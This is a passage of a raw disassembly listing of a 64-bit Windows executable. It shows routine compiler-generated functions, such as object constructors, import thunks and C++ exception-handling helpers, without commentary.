   14000a473:	48 c7 41 20 0f 00 00 	movq   $0xf,0x20(%rcx)
   14000a47a:	00 
   14000a47b:	49 83 c9 ff          	or     $0xffffffffffffffff,%r9
   14000a47f:	45 33 c0             	xor    %r8d,%r8d
   14000a482:	48 8b d9             	mov    %rcx,%rbx
   14000a485:	c6 41 08 00          	movb   $0x0,0x8(%rcx)
   14000a489:	e8 c2 6d ff ff       	call   0x140001250
   14000a48e:	48 8b c3             	mov    %rbx,%rax
   14000a491:	48 83 c4 20          	add    $0x20,%rsp
   14000a495:	5b                   	pop    %rbx
   14000a496:	c3                   	ret
   14000a497:	cc                   	int3
   14000a498:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000a49d:	57                   	push   %rdi
   14000a49e:	48 83 ec 30          	sub    $0x30,%rsp
   14000a4a2:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   14000a4a9:	ff ff 
   14000a4ab:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   14000a4b0:	48 8b da             	mov    %rdx,%rbx
   14000a4b3:	48 8b f9             	mov    %rcx,%rdi
   14000a4b6:	e8 4d 76 ff ff       	call   0x140001b08
   14000a4bb:	90                   	nop
   14000a4bc:	48 8d 05 75 5a 00 00 	lea    0x5a75(%rip),%rax        # 0x14000ff38
   14000a4c3:	48 89 07             	mov    %rax,(%rdi)
   14000a4c6:	48 8d 4f 18          	lea    0x18(%rdi),%rcx
   14000a4ca:	48 c7 41 20 0f 00 00 	movq   $0xf,0x20(%rcx)
   14000a4d1:	00 
   14000a4d2:	48 83 61 18 00       	andq   $0x0,0x18(%rcx)
   14000a4d7:	c6 41 08 00          	movb   $0x0,0x8(%rcx)
   14000a4db:	48 8d 53 18          	lea    0x18(%rbx),%rdx
   14000a4df:	49 83 c9 ff          	or     $0xffffffffffffffff,%r9
   14000a4e3:	45 33 c0             	xor    %r8d,%r8d
   14000a4e6:	e8 65 6d ff ff       	call   0x140001250
   14000a4eb:	90                   	nop
   14000a4ec:	48 8b c7             	mov    %rdi,%rax
   14000a4ef:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   14000a4f4:	48 83 c4 30          	add    $0x30,%rsp
   14000a4f8:	5f                   	pop    %rdi
   14000a4f9:	c3                   	ret
   14000a4fa:	cc                   	int3
   14000a4fb:	cc                   	int3
   14000a4fc:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000a501:	57                   	push   %rdi
   14000a502:	48 83 ec 30          	sub    $0x30,%rsp
   14000a506:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   14000a50d:	ff ff 
   14000a50f:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   14000a514:	48 8b da             	mov    %rdx,%rbx
   14000a517:	48 8b f9             	mov    %rcx,%rdi
   14000a51a:	e8 e9 75 ff ff       	call   0x140001b08
   14000a51f:	90                   	nop
   14000a520:	48 8d 05 11 5a 00 00 	lea    0x5a11(%rip),%rax        # 0x14000ff38
   14000a527:	48 89 07             	mov    %rax,(%rdi)
   14000a52a:	48 8d 4f 18          	lea    0x18(%rdi),%rcx
   14000a52e:	48 c7 41 20 0f 00 00 	movq   $0xf,0x20(%rcx)
   14000a535:	00 
   14000a536:	48 83 61 18 00       	andq   $0x0,0x18(%rcx)
   14000a53b:	c6 41 08 00          	movb   $0x0,0x8(%rcx)
   14000a53f:	48 8d 53 18          	lea    0x18(%rbx),%rdx
   14000a543:	49 83 c9 ff          	or     $0xffffffffffffffff,%r9
   14000a547:	45 33 c0             	xor    %r8d,%r8d
   14000a54a:	e8 01 6d ff ff       	call   0x140001250
   14000a54f:	90                   	nop
   14000a550:	48 8d 05 f9 59 00 00 	lea    0x59f9(%rip),%rax        # 0x14000ff50
   14000a557:	48 89 07             	mov    %rax,(%rdi)
   14000a55a:	48 8b c7             	mov    %rdi,%rax
   14000a55d:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   14000a562:	48 83 c4 30          	add    $0x30,%rsp
   14000a566:	5f                   	pop    %rdi
   14000a567:	c3                   	ret
   14000a568:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000a56d:	57                   	push   %rdi
   14000a56e:	48 83 ec 30          	sub    $0x30,%rsp
   14000a572:	48 c7 44 24 20 fe ff 	movq   $0xfffffffffffffffe,0x20(%rsp)
   14000a579:	ff ff 
   14000a57b:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   14000a580:	48 8b da             	mov    %rdx,%rbx
   14000a583:	48 8b f9             	mov    %rcx,%rdi
   14000a586:	e8 7d 75 ff ff       	call   0x140001b08
   14000a58b:	90                   	nop
   14000a58c:	48 8d 05 a5 59 00 00 	lea    0x59a5(%rip),%rax        # 0x14000ff38
   14000a593:	48 89 07             	mov    %rax,(%rdi)
   14000a596:	48 8d 4f 18          	lea    0x18(%rdi),%rcx
   14000a59a:	48 c7 41 20 0f 00 00 	movq   $0xf,0x20(%rcx)
   14000a5a1:	00 
   14000a5a2:	48 83 61 18 00       	andq   $0x0,0x18(%rcx)
   14000a5a7:	c6 41 08 00          	movb   $0x0,0x8(%rcx)
   14000a5ab:	48 8d 53 18          	lea    0x18(%rbx),%rdx
   14000a5af:	49 83 c9 ff          	or     $0xffffffffffffffff,%r9
   14000a5b3:	45 33 c0             	xor    %r8d,%r8d
   14000a5b6:	e8 95 6c ff ff       	call   0x140001250
   14000a5bb:	90                   	nop
   14000a5bc:	48 8d 05 a5 59 00 00 	lea    0x59a5(%rip),%rax        # 0x14000ff68
   14000a5c3:	48 89 07             	mov    %rax,(%rdi)
   14000a5c6:	48 8b c7             	mov    %rdi,%rax
   14000a5c9:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   14000a5ce:	48 83 c4 30          	add    $0x30,%rsp
   14000a5d2:	5f                   	pop    %rdi
   14000a5d3:	c3                   	ret
   14000a5d4:	ff 25 a6 3c 00 00    	jmp    *0x3ca6(%rip)        # 0x14000e280
   14000a5da:	ff 25 50 3b 00 00    	jmp    *0x3b50(%rip)        # 0x14000e130
   14000a5e0:	ff 25 52 3b 00 00    	jmp    *0x3b52(%rip)        # 0x14000e138
   14000a5e6:	ff 25 74 3b 00 00    	jmp    *0x3b74(%rip)        # 0x14000e160
   14000a5ec:	ff 25 de 3b 00 00    	jmp    *0x3bde(%rip)        # 0x14000e1d0
   14000a5f2:	cc                   	int3
   14000a5f3:	cc                   	int3
   14000a5f4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000a5f9:	48 89 6c 24 18       	mov    %rbp,0x18(%rsp)
   14000a5fe:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000a603:	57                   	push   %rdi
   14000a604:	41 54                	push   %r12
   14000a606:	41 55                	push   %r13
   14000a608:	41 56                	push   %r14
   14000a60a:	41 57                	push   %r15
   14000a60c:	48 83 ec 20          	sub    $0x20,%rsp
   14000a610:	49 63 78 0c          	movslq 0xc(%r8),%rdi
   14000a614:	4c 8b f9             	mov    %rcx,%r15
   14000a617:	49 8b c8             	mov    %r8,%rcx
   14000a61a:	49 8b e9             	mov    %r9,%rbp
   14000a61d:	4d 8b e8             	mov    %r8,%r13
   14000a620:	4c 8b f2             	mov    %rdx,%r14
   14000a623:	e8 c0 06 00 00       	call   0x14000ace8
   14000a628:	4d 8b 17             	mov    (%r15),%r10
   14000a62b:	4c 89 55 00          	mov    %r10,0x0(%rbp)
   14000a62f:	44 8b e0             	mov    %eax,%r12d
   14000a632:	85 ff                	test   %edi,%edi
   14000a634:	0f 84 85 00 00 00    	je     0x14000a6bf
   14000a63a:	48 8d 0c bf          	lea    (%rdi,%rdi,4),%rcx
   14000a63e:	48 8d 34 8d ec ff ff 	lea    -0x14(,%rcx,4),%rsi
   14000a645:	ff 
   14000a646:	49 63 5d 10          	movslq 0x10(%r13),%rbx
   14000a64a:	49 03 5e 08          	add    0x8(%r14),%rbx
   14000a64e:	48 03 de             	add    %rsi,%rbx
   14000a651:	44 3b 63 04          	cmp    0x4(%rbx),%r12d
   14000a655:	7e 49                	jle    0x14000a6a0
   14000a657:	44 3b 63 08          	cmp    0x8(%rbx),%r12d
   14000a65b:	7f 43                	jg     0x14000a6a0
   14000a65d:	49 8b 0e             	mov    (%r14),%rcx
   14000a660:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000a665:	45 33 c0             	xor    %r8d,%r8d
   14000a668:	e8 73 ff ff ff       	call   0x14000a5e0
   14000a66d:	4c 63 43 10          	movslq 0x10(%rbx),%r8
   14000a671:	44 8b 4b 0c          	mov    0xc(%rbx),%r9d
   14000a675:	4c 03 44 24 50       	add    0x50(%rsp),%r8
   14000a67a:	44 8b 10             	mov    (%rax),%r10d
   14000a67d:	33 c9                	xor    %ecx,%ecx
   14000a67f:	45 85 c9             	test   %r9d,%r9d
   14000a682:	74 17                	je     0x14000a69b
   14000a684:	49 8d 50 0c          	lea    0xc(%r8),%rdx
   14000a688:	48 63 02             	movslq (%rdx),%rax
   14000a68b:	49 3b c2             	cmp    %r10,%rax
   14000a68e:	74 0b                	je     0x14000a69b
   14000a690:	ff c1                	inc    %ecx
   14000a692:	48 83 c2 14          	add    $0x14,%rdx
   14000a696:	41 3b c9             	cmp    %r9d,%ecx
   14000a699:	72 ed                	jb     0x14000a688
   14000a69b:	41 3b c9             	cmp    %r9d,%ecx
   14000a69e:	72 0b                	jb     0x14000a6ab
   14000a6a0:	48 83 ee 14          	sub    $0x14,%rsi
   14000a6a4:	83 c7 ff             	add    $0xffffffff,%edi
   14000a6a7:	74 16                	je     0x14000a6bf
   14000a6a9:	eb 9b                	jmp    0x14000a646
   14000a6ab:	49 8b 07             	mov    (%r15),%rax
   14000a6ae:	48 8d 0c 89          	lea    (%rcx,%rcx,4),%rcx
   14000a6b2:	49 63 4c 88 10       	movslq 0x10(%r8,%rcx,4),%rcx
   14000a6b7:	48 8b 0c 01          	mov    (%rcx,%rax,1),%rcx
   14000a6bb:	48 89 4d 00          	mov    %rcx,0x0(%rbp)
   14000a6bf:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   14000a6c4:	48 8b 74 24 68       	mov    0x68(%rsp),%rsi
   14000a6c9:	48 8b c5             	mov    %rbp,%rax
   14000a6cc:	48 8b 6c 24 60       	mov    0x60(%rsp),%rbp
   14000a6d1:	48 83 c4 20          	add    $0x20,%rsp
   14000a6d5:	41 5f                	pop    %r15
   14000a6d7:	41 5e                	pop    %r14
   14000a6d9:	41 5d                	pop    %r13
   14000a6db:	41 5c                	pop    %r12
   14000a6dd:	5f                   	pop    %rdi
   14000a6de:	c3                   	ret
   14000a6df:	cc                   	int3
   14000a6e0:	48 83 ec 28          	sub    $0x28,%rsp
   14000a6e4:	e8 27 8f ff ff       	call   0x140003610
   14000a6e9:	48 8b 80 28 01 00 00 	mov    0x128(%rax),%rax
   14000a6f0:	48 83 c4 28          	add    $0x28,%rsp
   14000a6f4:	c3                   	ret
   14000a6f5:	cc                   	int3
   14000a6f6:	cc                   	int3
   14000a6f7:	cc                   	int3
   14000a6f8:	48 83 ec 28          	sub    $0x28,%rsp
   14000a6fc:	e8 0f 8f ff ff       	call   0x140003610
   14000a701:	48 8b 80 30 01 00 00 	mov    0x130(%rax),%rax
   14000a708:	48 83 c4 28          	add    $0x28,%rsp
   14000a70c:	c3                   	ret
   14000a70d:	cc                   	int3
   14000a70e:	cc                   	int3
   14000a70f:	cc                   	int3
   14000a710:	40 53                	rex push %rbx
   14000a712:	48 83 ec 20          	sub    $0x20,%rsp
   14000a716:	48 8b d9             	mov    %rcx,%rbx
   14000a719:	e8 f2 8e ff ff       	call   0x140003610
   14000a71e:	48 89 98 28 01 00 00 	mov    %rbx,0x128(%rax)
   14000a725:	48 83 c4 20          	add    $0x20,%rsp
   14000a729:	5b                   	pop    %rbx
   14000a72a:	c3                   	ret
   14000a72b:	cc                   	int3
   14000a72c:	40 53                	rex push %rbx
   14000a72e:	48 83 ec 20          	sub    $0x20,%rsp
   14000a732:	48 8b d9             	mov    %rcx,%rbx
   14000a735:	e8 d6 8e ff ff       	call   0x140003610
   14000a73a:	48 89 98 30 01 00 00 	mov    %rbx,0x130(%rax)
   14000a741:	48 83 c4 20          	add    $0x20,%rsp
   14000a745:	5b                   	pop    %rbx
   14000a746:	c3                   	ret
   14000a747:	cc                   	int3
   14000a748:	48 8b c4             	mov    %rsp,%rax
   14000a74b:	48 89 58 08          	mov    %rbx,0x8(%rax)
   14000a74f:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000a753:	48 89 70 20          	mov    %rsi,0x20(%rax)
   14000a757:	57                   	push   %rdi
   14000a758:	41 54                	push   %r12
   14000a75a:	41 55                	push   %r13
   14000a75c:	48 83 ec 20          	sub    $0x20,%rsp
   14000a760:	4c 8d 48 18          	lea    0x18(%rax),%r9
   14000a764:	49 8b e8             	mov    %r8,%rbp
   14000a767:	4c 8b e2             	mov    %rdx,%r12
   14000a76a:	e8 85 fe ff ff       	call   0x14000a5f4
   14000a76f:	49 8b d4             	mov    %r12,%rdx
   14000a772:	48 8b cd             	mov    %rbp,%rcx
   14000a775:	4c 8b e8             	mov    %rax,%r13
   14000a778:	e8 6b 05 00 00       	call   0x14000ace8
   14000a77d:	48 63 7d 0c          	movslq 0xc(%rbp),%rdi
   14000a781:	8b f0                	mov    %eax,%esi
   14000a783:	85 ff                	test   %edi,%edi
   14000a785:	74 35                	je     0x14000a7bc
   14000a787:	48 8d 0c bf          	lea    (%rdi,%rdi,4),%rcx
   14000a78b:	48 8d 1c 8d ec ff ff 	lea    -0x14(,%rcx,4),%rbx
   14000a792:	ff 
   14000a793:	e8 78 8e ff ff       	call   0x140003610
   14000a798:	48 63 4d 10          	movslq 0x10(%rbp),%rcx
   14000a79c:	48 8b 90 28 01 00 00 	mov    0x128(%rax),%rdx
   14000a7a3:	48 03 d1             	add    %rcx,%rdx
   14000a7a6:	48 03 d3             	add    %rbx,%rdx
   14000a7a9:	3b 72 04             	cmp    0x4(%rdx),%esi
   14000a7ac:	7e 05                	jle    0x14000a7b3
   14000a7ae:	3b 72 08             	cmp    0x8(%rdx),%esi
   14000a7b1:	7e 0b                	jle    0x14000a7be
   14000a7b3:	48 83 eb 14          	sub    $0x14,%rbx
   14000a7b7:	83 c7 ff             	add    $0xffffffff,%edi
   14000a7ba:	75 d7                	jne    0x14000a793
   14000a7bc:	33 d2                	xor    %edx,%edx
   14000a7be:	48 85 d2             	test   %rdx,%rdx
   14000a7c1:	75 06                	jne    0x14000a7c9
   14000a7c3:	41 83 c9 ff          	or     $0xffffffff,%r9d
   14000a7c7:	eb 04                	jmp    0x14000a7cd
   14000a7c9:	44 8b 4a 04          	mov    0x4(%rdx),%r9d
   14000a7cd:	4c 8b c5             	mov    %rbp,%r8
   14000a7d0:	49 8b d4             	mov    %r12,%rdx
   14000a7d3:	49 8b cd             	mov    %r13,%rcx
   14000a7d6:	e8 6d 07 00 00       	call   0x14000af48
   14000a7db:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000a7e0:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000a7e5:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   14000a7ea:	48 83 c4 20          	add    $0x20,%rsp
   14000a7ee:	41 5d                	pop    %r13
   14000a7f0:	41 5c                	pop    %r12
   14000a7f2:	5f                   	pop    %rdi
   14000a7f3:	c3                   	ret
   14000a7f4:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   14000a7f9:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000a7fe:	57                   	push   %rdi
   14000a7ff:	48 83 ec 40          	sub    $0x40,%rsp
   14000a803:	49 8b d9             	mov    %r9,%rbx
   14000a806:	49 8b f8             	mov    %r8,%rdi
   14000a809:	48 8b f1             	mov    %rcx,%rsi
   14000a80c:	48 89 54 24 50       	mov    %rdx,0x50(%rsp)
   14000a811:	e8 fa 8d ff ff       	call   0x140003610
   14000a816:	48 8b 53 08          	mov    0x8(%rbx),%rdx
   14000a81a:	48 89 90 28 01 00 00 	mov    %rdx,0x128(%rax)
   14000a821:	e8 ea 8d ff ff       	call   0x140003610
   14000a826:	48 8b 56 38          	mov    0x38(%rsi),%rdx
   14000a82a:	48 89 90 30 01 00 00 	mov    %rdx,0x130(%rax)
   14000a831:	e8 da 8d ff ff       	call   0x140003610
   14000a836:	48 8b 53 38          	mov    0x38(%rbx),%rdx
   14000a83a:	44 8b 02             	mov    (%rdx),%r8d
   14000a83d:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   14000a842:	4c 8b cb             	mov    %rbx,%r9
   14000a845:	4c 03 80 28 01 00 00 	add    0x128(%rax),%r8
   14000a84c:	33 c0                	xor    %eax,%eax
   14000a84e:	48 8b ce             	mov    %rsi,%rcx
   14000a851:	89 44 24 38          	mov    %eax,0x38(%rsp)
   14000a855:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   14000a85a:	89 44 24 28          	mov    %eax,0x28(%rsp)
   14000a85e:	4c 89 44 24 20       	mov    %r8,0x20(%rsp)
   14000a863:	4c 8b c7             	mov    %rdi,%r8
   14000a866:	e8 4d 17 00 00       	call   0x14000bfb8
   14000a86b:	48 8b 5c 24 58       	mov    0x58(%rsp),%rbx
   14000a870:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000a875:	48 83 c4 40          	add    $0x40,%rsp
   14000a879:	5f                   	pop    %rdi
   14000a87a:	c3                   	ret
   14000a87b:	cc                   	int3
   14000a87c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a881:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000a886:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000a88b:	57                   	push   %rdi
   14000a88c:	48 83 ec 40          	sub    $0x40,%rsp
   14000a890:	49 8b f1             	mov    %r9,%rsi
   14000a893:	49 8b e8             	mov    %r8,%rbp
   14000a896:	48 8b da             	mov    %rdx,%rbx
   14000a899:	48 8b f9             	mov    %rcx,%rdi
   14000a89c:	e8 6f 8d ff ff       	call   0x140003610
   14000a8a1:	48 89 98 38 01 00 00 	mov    %rbx,0x138(%rax)
   14000a8a8:	48 8b 1f             	mov    (%rdi),%rbx
   14000a8ab:	e8 60 8d ff ff       	call   0x140003610
   14000a8b0:	48 8b 53 38          	mov    0x38(%rbx),%rdx
   14000a8b4:	48 8b 4c 24 78       	mov    0x78(%rsp),%rcx
   14000a8b9:	4c 8b 4c 24 70       	mov    0x70(%rsp),%r9
   14000a8be:	c7 44 24 38 01 00 00 	movl   $0x1,0x38(%rsp)
   14000a8c5:	00 
   14000a8c6:	48 89 90 30 01 00 00 	mov    %rdx,0x130(%rax)
   14000a8cd:	33 db                	xor    %ebx,%ebx
   14000a8cf:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   14000a8d4:	89 5c 24 28          	mov    %ebx,0x28(%rsp)
   14000a8d8:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   14000a8dd:	48 8b 0f             	mov    (%rdi),%rcx
   14000a8e0:	4c 8b c6             	mov    %rsi,%r8
   14000a8e3:	48 8b d5             	mov    %rbp,%rdx
   14000a8e6:	e8 cd 16 00 00       	call   0x14000bfb8
   14000a8eb:	e8 20 8d ff ff       	call   0x140003610
   14000a8f0:	48 8b 8c 24 80 00 00 	mov    0x80(%rsp),%rcx
   14000a8f7:	00 
   14000a8f8:	48 8b 6c 24 58       	mov    0x58(%rsp),%rbp
   14000a8fd:	48 8b 74 24 60       	mov    0x60(%rsp),%rsi
   14000a902:	48 89 98 38 01 00 00 	mov    %rbx,0x138(%rax)
   14000a909:	8d 43 01             	lea    0x1(%rbx),%eax
   14000a90c:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   14000a911:	c7 01 01 00 00 00    	movl   $0x1,(%rcx)
   14000a917:	48 83 c4 40          	add    $0x40,%rsp
   14000a91b:	5f                   	pop    %rdi
   14000a91c:	c3                   	ret
   14000a91d:	cc                   	int3
   14000a91e:	cc                   	int3
   14000a91f:	cc                   	int3
   14000a920:	48 8b c4             	mov    %rsp,%rax
   14000a923:	4c 89 48 20          	mov    %r9,0x20(%rax)
   14000a927:	4c 89 40 18          	mov    %r8,0x18(%rax)
   14000a92b:	48 89 50 10          	mov    %rdx,0x10(%rax)
   14000a92f:	48 89 48 08          	mov    %rcx,0x8(%rax)
   14000a933:	53                   	push   %rbx
   14000a934:	48 83 ec 60          	sub    $0x60,%rsp
   14000a938:	48 8b d9             	mov    %rcx,%rbx
   14000a93b:	83 60 d8 00          	andl   $0x0,-0x28(%rax)
   14000a93f:	48 89 48 e0          	mov    %rcx,-0x20(%rax)
   14000a943:	4c 89 40 e8          	mov    %r8,-0x18(%rax)
   14000a947:	e8 c4 8c ff ff       	call   0x140003610
   14000a94c:	4c 8b 80 e0 00 00 00 	mov    0xe0(%rax),%r8
   14000a953:	48 8d 54 24 48       	lea    0x48(%rsp),%rdx
   14000a958:	8b 0b                	mov    (%rbx),%ecx
   14000a95a:	41 ff d0             	call   *%r8
   14000a95d:	c7 44 24 40 00 00 00 	movl   $0x0,0x40(%rsp)
   14000a964:	00 
   14000a965:	eb 00                	jmp    0x14000a967
   14000a967:	8b 44 24 40          	mov    0x40(%rsp),%eax
   14000a96b:	48 83 c4 60          	add    $0x60,%rsp
   14000a96f:	5b                   	pop    %rbx
   14000a970:	c3                   	ret
   14000a971:	cc                   	int3
   14000a972:	cc                   	int3
   14000a973:	cc                   	int3
   14000a974:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000a979:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   14000a97e:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000a983:	57                   	push   %rdi
   14000a984:	41 54                	push   %r12
   14000a986:	41 55                	push   %r13
   14000a988:	48 83 ec 20          	sub    $0x20,%rsp
   14000a98c:	48 63 5a 0c          	movslq 0xc(%rdx),%rbx
   14000a990:	4c 8b 64 24 70       	mov    0x70(%rsp),%r12
   14000a995:	48 8b f2             	mov    %rdx,%rsi
   14000a998:	48 8b ce             	mov    %rsi,%rcx
   14000a99b:	49 8b d4             	mov    %r12,%rdx
   14000a99e:	45 8b e9             	mov    %r9d,%r13d
   14000a9a1:	33 ed                	xor    %ebp,%ebp
   14000a9a3:	e8 40 03 00 00       	call   0x14000ace8
   14000a9a8:	8b f8                	mov    %eax,%edi
   14000a9aa:	85 db                	test   %ebx,%ebx
   14000a9ac:	75 05                	jne    0x14000a9b3
   14000a9ae:	e8 39 96 ff ff       	call   0x140003fec
   14000a9b3:	4c 8b 54 24 68       	mov    0x68(%rsp),%r10
   14000a9b8:	4c 8b 44 24 60       	mov    0x60(%rsp),%r8
   14000a9bd:	41 83 cb ff          	or     $0xffffffff,%r11d
   14000a9c1:	45 89 1a             	mov    %r11d,(%r10)
   14000a9c4:	8b d3                	mov    %ebx,%edx
   14000a9c6:	45 89 18             	mov    %r11d,(%r8)
   14000a9c9:	85 db                	test   %ebx,%ebx
   14000a9cb:	74 2a                	je     0x14000a9f7
   14000a9cd:	48 63 4e 10          	movslq 0x10(%rsi),%rcx
   14000a9d1:	48 8d 04 9b          	lea    (%rbx,%rbx,4),%rax
   14000a9d5:	48 8d 0c 81          	lea    (%rcx,%rax,4),%rcx
   14000a9d9:	49 8b 44 24 08       	mov    0x8(%r12),%rax
   14000a9de:	4c 8d 4c 01 f4       	lea    -0xc(%rcx,%rax,1),%r9
   14000a9e3:	41 3b 79 fc          	cmp    -0x4(%r9),%edi
   14000a9e7:	7e 05                	jle    0x14000a9ee
   14000a9e9:	41 3b 39             	cmp    (%r9),%edi
   14000a9ec:	7e 09                	jle    0x14000a9f7
   14000a9ee:	49 83 e9 14          	sub    $0x14,%r9
   14000a9f2:	41 03 d3             	add    %r11d,%edx
   14000a9f5:	75 ec                	jne    0x14000a9e3
   14000a9f7:	85 d2                	test   %edx,%edx
   14000a9f9:	74 14                	je     0x14000aa0f
   14000a9fb:	8d 42 ff             	lea    -0x1(%rdx),%eax
   14000a9fe:	48 8d 14 80          	lea    (%rax,%rax,4),%rdx
   14000aa02:	48 63 46 10          	movslq 0x10(%rsi),%rax
   14000aa06:	48 8d 2c 90          	lea    (%rax,%rdx,4),%rbp
   14000aa0a:	49 03 6c 24 08       	add    0x8(%r12),%rbp
   14000aa0f:	33 d2                	xor    %edx,%edx
   14000aa11:	85 db                	test   %ebx,%ebx
   14000aa13:	74 61                	je     0x14000aa76
   14000aa15:	45 33 c9             	xor    %r9d,%r9d
   14000aa18:	48 63 4e 10          	movslq 0x10(%rsi),%rcx
   14000aa1c:	49 03 4c 24 08       	add    0x8(%r12),%rcx
   14000aa21:	49 03 c9             	add    %r9,%rcx
   14000aa24:	48 85 ed             	test   %rbp,%rbp
   14000aa27:	74 0f                	je     0x14000aa38
   14000aa29:	8b 45 04             	mov    0x4(%rbp),%eax
   14000aa2c:	39 01                	cmp    %eax,(%rcx)
   14000aa2e:	7e 21                	jle    0x14000aa51
   14000aa30:	8b 45 08             	mov    0x8(%rbp),%eax
   14000aa33:	39 41 04             	cmp    %eax,0x4(%rcx)
   14000aa36:	7f 19                	jg     0x14000aa51
   14000aa38:	44 3b 29             	cmp    (%rcx),%r13d
   14000aa3b:	7c 14                	jl     0x14000aa51
   14000aa3d:	44 3b 69 04          	cmp    0x4(%rcx),%r13d
   14000aa41:	7f 0e                	jg     0x14000aa51
   14000aa43:	45 39 18             	cmp    %r11d,(%r8)
   14000aa46:	75 03                	jne    0x14000aa4b
   14000aa48:	41 89 10             	mov    %edx,(%r8)
   14000aa4b:	8d 42 01             	lea    0x1(%rdx),%eax
   14000aa4e:	41 89 02             	mov    %eax,(%r10)
   14000aa51:	ff c2                	inc    %edx
   14000aa53:	49 83 c1 14          	add    $0x14,%r9
   14000aa57:	3b d3                	cmp    %ebx,%edx
   14000aa59:	72 bd                	jb     0x14000aa18
   14000aa5b:	45 39 18             	cmp    %r11d,(%r8)
   14000aa5e:	74 16                	je     0x14000aa76
   14000aa60:	41 8b 00             	mov    (%r8),%eax
   14000aa63:	48 8d 0c 80          	lea    (%rax,%rax,4),%rcx
   14000aa67:	48 63 46 10          	movslq 0x10(%rsi),%rax
   14000aa6b:	48 8d 04 88          	lea    (%rax,%rcx,4),%rax
   14000aa6f:	49 03 44 24 08       	add    0x8(%r12),%rax
   14000aa74:	eb 0a                	jmp    0x14000aa80
   14000aa76:	41 83 20 00          	andl   $0x0,(%r8)
   14000aa7a:	41 83 22 00          	andl   $0x0,(%r10)
   14000aa7e:	33 c0                	xor    %eax,%eax
   14000aa80:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   14000aa85:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   14000aa8a:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000aa8f:	48 83 c4 20          	add    $0x20,%rsp
   14000aa93:	41 5d                	pop    %r13
   14000aa95:	41 5c                	pop    %r12
   14000aa97:	5f                   	pop    %rdi
   14000aa98:	c3                   	ret
   14000aa99:	cc                   	int3
   14000aa9a:	cc                   	int3
   14000aa9b:	cc                   	int3
   14000aa9c:	40 53                	rex push %rbx
   14000aa9e:	48 83 ec 20          	sub    $0x20,%rsp
   14000aaa2:	48 8b d9             	mov    %rcx,%rbx
   14000aaa5:	48 89 11             	mov    %rdx,(%rcx)
   14000aaa8:	e8 63 8b ff ff       	call   0x140003610
   14000aaad:	48 3b 98 20 01 00 00 	cmp    0x120(%rax),%rbx
   14000aab4:	73 0e                	jae    0x14000aac4
   14000aab6:	e8 55 8b ff ff       	call   0x140003610
   14000aabb:	48 8b 88 20 01 00 00 	mov    0x120(%rax),%rcx
   14000aac2:	eb 02                	jmp    0x14000aac6
   14000aac4:	33 c9                	xor    %ecx,%ecx
   14000aac6:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   14000aaca:	e8 41 8b ff ff       	call   0x140003610
   14000aacf:	48 89 98 20 01 00 00 	mov    %rbx,0x120(%rax)
   14000aad6:	48 8b c3             	mov    %rbx,%rax
   14000aad9:	48 83 c4 20          	add    $0x20,%rsp
   14000aadd:	5b                   	pop    %rbx
   14000aade:	c3                   	ret
   14000aadf:	cc                   	int3
   14000aae0:	40 53                	rex push %rbx
   14000aae2:	48 83 ec 20          	sub    $0x20,%rsp
   14000aae6:	48 8b d9             	mov    %rcx,%rbx
   14000aae9:	e8 22 8b ff ff       	call   0x140003610
   14000aaee:	48 8b 90 20 01 00 00 	mov    0x120(%rax),%rdx
   14000aaf5:	eb 09                	jmp    0x14000ab00
   14000aaf7:	48 39 1a             	cmp    %rbx,(%rdx)
   14000aafa:	74 12                	je     0x14000ab0e
   14000aafc:	48 8b 52 08          	mov    0x8(%rdx),%rdx
   14000ab00:	48 85 d2             	test   %rdx,%rdx
   14000ab03:	75 f2                	jne    0x14000aaf7
   14000ab05:	8d 42 01             	lea    0x1(%rdx),%eax
   14000ab08:	48 83 c4 20          	add    $0x20,%rsp
   14000ab0c:	5b                   	pop    %rbx
   14000ab0d:	c3                   	ret
   14000ab0e:	33 c0                	xor    %eax,%eax
   14000ab10:	eb f6                	jmp    0x14000ab08
   14000ab12:	cc                   	int3
   14000ab13:	cc                   	int3
   14000ab14:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000ab19:	57                   	push   %rdi
   14000ab1a:	48 83 ec 20          	sub    $0x20,%rsp
   14000ab1e:	48 8b f9             	mov    %rcx,%rdi
   14000ab21:	e8 ea 8a ff ff       	call   0x140003610
   14000ab26:	48 3b b8 20 01 00 00 	cmp    0x120(%rax),%rdi
   14000ab2d:	74 05                	je     0x14000ab34
